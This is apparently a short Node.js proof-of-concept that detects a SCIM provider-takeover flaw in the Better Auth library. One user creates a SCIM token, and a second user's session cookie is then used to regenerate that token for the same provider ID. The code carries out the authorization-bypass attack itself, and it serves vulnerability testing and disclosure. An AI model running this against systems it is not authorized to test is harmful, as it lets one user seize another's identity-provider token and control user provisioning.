#!/usr/bin/env node
// Better Auth SCIM Provider Takeover Detector
// Usage: node poc.js <BASE_URL> <ALICE_TOKEN> <BOB_TOKEN> [PROVIDER_ID]

const [,, BASE_URL, ALICE_TOKEN, BOB_TOKEN, PROVIDER_ID = "corp-idp"] = process.argv;

if (!BASE_URL || !ALICE_TOKEN || !BOB_TOKEN) {
  console.log("Usage: node poc.js <BASE_URL> <ALICE_TOKEN> <BOB_TOKEN> [PROVIDER_ID]");
  process.exit(1);
}

const req = (endpoint, token, opts = {}) => fetch(`${BASE_URL}${endpoint}`, {
  ...opts,
  headers: { 
    "Content-Type": "application/json", 
    "Origin": new URL(BASE_URL).origin,
    "Cookie": `better-auth.session_token=${token}`
  }
});

async function run() {
  console.log("[*] Alice creates provider...");
  await req("/scim/generate-token", ALICE_TOKEN, { method: "POST", body: JSON.stringify({ providerId: PROVIDER_ID }) });

  console.log("[*] Bob attempts to regenerate Alice's token...");
  const res = await req("/scim/generate-token", BOB_TOKEN, { method: "POST", body: JSON.stringify({ providerId: PROVIDER_ID }) });
  
  if (res.status === 200 || res.status === 201) {
    console.log("[VULNERABLE] Bob successfully regenerated Alice's provider token!");
    process.exit(1);
  } else {
    console.log("[SAFE] Bob was denied access.");
    process.exit(0);
  }
}
run();
